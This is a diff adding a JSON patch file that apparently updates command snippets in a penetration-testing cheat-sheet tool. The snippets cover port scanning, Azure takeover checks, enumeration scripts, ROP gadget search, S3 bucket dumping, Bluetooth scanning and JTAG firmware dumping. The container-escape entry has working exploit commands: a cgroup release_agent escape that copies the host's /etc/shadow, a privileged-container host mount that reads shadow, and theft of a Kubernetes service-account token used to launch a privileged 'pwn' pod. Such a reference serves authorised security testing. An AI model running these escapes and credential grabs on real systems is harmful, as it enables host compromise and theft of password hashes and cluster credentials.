@@ -1,0 +1,146 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "network-scanning-advanced",
+      "patches": [
+        {
+          "path": "commands.0.command",
+          "value": "masscan -p1-65535 target/24 --rate=1000 -oG masscan.txt\nports=$(grep open masscan.txt | awk '{print $5}' | cut -d/ -f1 | sort -un | tr '\\n' ',' | sed 's/,$//')\nnmap -sV -sC -p\"$ports\" target"
+        }
+      ]
+    },
+    {
+      "id": "cloud-azure-pentest",
+      "patches": [
+        {
+          "path": "commands.5.command",
+          "value": "printf '%s\\n' 'source[01] custom=app.example.invalid target=*.azurewebsites.net verify=azure-portal-custom-domain'\nprintf '%s\\n' 'source[02] custom=static.example.invalid target=*.blob.core.windows.net verify=azure-portal-custom-domain'\nprintf '%s\\n' 'source[03] custom=cdn.example.invalid target=*.azureedge.net verify=azure-portal-custom-domain'\nprintf '%s\\n' 'source[04] custom=edge.example.invalid target=*.azurefd.net verify=azure-portal-custom-domain'\nprintf '%s\\n' 'source[05] custom=vm.example.invalid target=*.cloudapp.azure.com verify=azure-portal-custom-domain'\nprintf '%s\\n' 'source[06] custom=tm.example.invalid target=*.trafficmanager.net verify=azure-portal-custom-domain'"
+        }
+      ]
+    },
+    {
+      "id": "container-escape",
+      "patches": [
+        {
+          "path": "commands.0.command",
+          "value": "cat /proc/1/cgroup | grep docker\nls /.dockerenv\ncat /proc/self/status | grep CapEff\ncapsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')"
+        },
+        {
+          "path": "commands.1.command",
+          "value": "# 检测可写 cgroup release_agent\nmount | grep cgroup\nmkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nhost_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\necho '#!/bin/sh' > /cmd\necho \"cat /etc/shadow > $host_path/output\" >> /cmd\nchmod a+x /cmd\necho \"$host_path/cmd\" > /tmp/cgrp/release_agent\nsh -c \"echo 1 > /tmp/cgrp/x/cgroup.procs\""
+        },
+        {
+          "path": "commands.2.command",
+          "value": "# 特权容器\nfdisk -l\nmount /dev/sda1 /mnt\nchroot /mnt\n# 读取宿主机 shadow\ncat /etc/shadow"
+        },
+        {
+          "path": "commands.3.command",
+          "value": "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\ncurl -k https://kubernetes.default.svc/api/v1/namespaces -H \"Authorization: Bearer $TOKEN\"\n# 创建特权 Pod 逃逸\nkubectl --token=$TOKEN run pwn --image=alpine --restart=Never --overrides='{\"spec\":{\"containers\":[{\"name\":\"pwn\",\"image\":\"alpine\",\"securityContext\":{\"privileged\":true}}]}}'"
+        }
+      ]
+    },
+    {
+      "id": "enumeration-automation",
+      "patches": [
+        {
+          "path": "commands.1.command",
+          "value": "#!/bin/bash\nTARGET=$1\nnmap -sC -sV -oA nmap_${TARGET} ${TARGET}\ngobuster dir -u http://${TARGET} -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_${TARGET}.txt\necho 'Done!' && cat nmap_${TARGET}.nmap gobuster_${TARGET}.txt"
+        },
+        {
+          "path": "commands.2.command",
+          "value": "#!/bin/bash\nDOMAIN=$1\nsubfinder -d ${DOMAIN} -silent | httpx -silent | tee alive.txt | nuclei -t cves/ -severity high,critical -o vulns.txt\necho \"Done: $(wc -l < alive.txt) alive, $(wc -l < vulns.txt) vulns\""
+        }
+      ]
+    },
+    {
+      "id": "file-upload-attacks",
+      "patches": [
+        {
+          "path": "commands.14.command",
+          "value": "php -r 'printf(\"php=%s integer_size=%d\\\\n\", PHP_VERSION, PHP_INT_SIZE);'\npython3 -c \"import platform,sys; print(f'python={sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro} platform={platform.system()}')\"\nnode -e \"console.log('node=' + process.versions.node + ' platform=' + process.platform)\"\nprintf \"%s\\n\" \"fixture=PAYLOADER_MARKER\"\nprintf \"%s\\n\" \"requirement=byte-level request capture and final-path audit\""
+        }
+      ]
+    },
+    {
+      "id": "hex-encode",
+      "patches": [
+        {
+          "path": "commands.0.command",
+          "value": "# Linux:\necho -n \"payload\" | xxd -p\necho -n \"payload\" | od -A n -t x1 | tr -d \" \\n\"\n\n# Python:\npython3 -c \"print('payload'.encode().hex())\"\npython3 -c 'print(\"\".join(f\"{b:02x}\" for b in \"payload\".encode()))'"
+        }
+      ]
+    },
+    {
+      "id": "macro-analysis",
+      "patches": [
+        {
+          "path": "commands.2.command",
+          "value": "# node.js\nnode -e 'eval(require(\"fs\").readFileSync(\"mal.js\",\"utf8\"))' 2>&1 | head\n# browser console\n# 替换 eval/document.write 为 console.log"
+        }
+      ]
+    },
+    {
+      "id": "exploit-dev-tools",
+      "patches": [
+        {
+          "path": "commands.2.command",
+          "value": "ROPgadget --binary ./binary\nROPgadget --binary ./binary --string \"/bin/sh\"\nROPgadget --binary ./libc.so.6 | grep \"pop rdi\""
+        },
+        {
+          "path": "commands.5.command",
+          "value": "printf 'BITS 64\\nxor rdi,rdi\\nmov rax,60\\nsyscall\\n' > exit.asm; nasm -f bin exit.asm -o exit.bin; xxd exit.bin"
+        },
+        {
+          "path": "commands.6.command",
+          "value": "./find printf 0xabc puts 0xdef\n# 或在线: https://libc.blukat.me/"
+        }
+      ]
+    },
+    {
+      "id": "cloud-misc-tools",
+      "patches": [
+        {
+          "path": "commands.1.command",
+          "value": "s3scanner scan --buckets target-bucket\ns3scanner dump --buckets target-bucket"
+        }
+      ]
+    },
+    {
+      "id": "misc-useful-commands",
+      "patches": [
+        {
+          "path": "commands.3.command",
+          "value": "python3 -c 'import ipaddress; print(list(ipaddress.ip_network(\"192.168.1.0/24\").hosts()))'\nipcalc 192.168.1.0/24\nsipcalc -n 10.0.0.0/8"
+        }
+      ]
+    },
+    {
+      "id": "bluetooth-security",
+      "patches": [
+        {
+          "path": "commands.0.command",
+          "value": "hciconfig hci0 up\nhcitool scan\ntimeout 30 hcitool lescan  # BLE 设备\nbluetoothctl scan on"
+        }
+      ]
+    },
+    {
+      "id": "hardware-security",
+      "patches": [
+        {
+          "path": "commands.1.command",
+          "value": "openocd -f interface/ftdi/olimex-jtag-tiny.cfg -f target/stm32f1x.cfg\ntelnet localhost 4444\n# OpenOCD 命令\nhalt; dump_image firmware.bin 0x08000000 0x100000"
+        }
+      ]
+    },
+    {
+      "id": "modern-cli-toolkit",
+      "patches": [
+        {
+          "path": "commands.9.command",
+          "value": "mlr --csv filter '$status == \"ok\"' data.csv"
+        }
+      ]
+    }
+  ]
+}
